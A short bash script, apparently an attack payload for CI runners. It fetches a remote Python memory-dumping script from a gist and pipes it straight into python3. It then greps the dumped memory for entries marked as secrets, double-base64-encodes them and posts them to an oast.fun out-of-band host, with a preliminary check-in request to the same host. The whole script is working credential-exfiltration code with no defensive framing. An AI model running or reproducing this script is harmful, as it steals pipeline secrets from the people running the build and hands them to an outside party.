#!/bin/bash

PYTHON_CHECK=`python3 -c 'print(1)'`

curl -s -d "$PYTHON_CHECK" "https://dqlfdzgroddmzbuqfjndfaghnnk8bq84t.oast.fun/pythoncheck" > /dev/null



B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0`

curl -s -d "$B64_BLOB" "https://dqlfdzgroddmzbuqfjndfaghnnk8bq84t.oast.fun/" > /dev/null

echo "Done"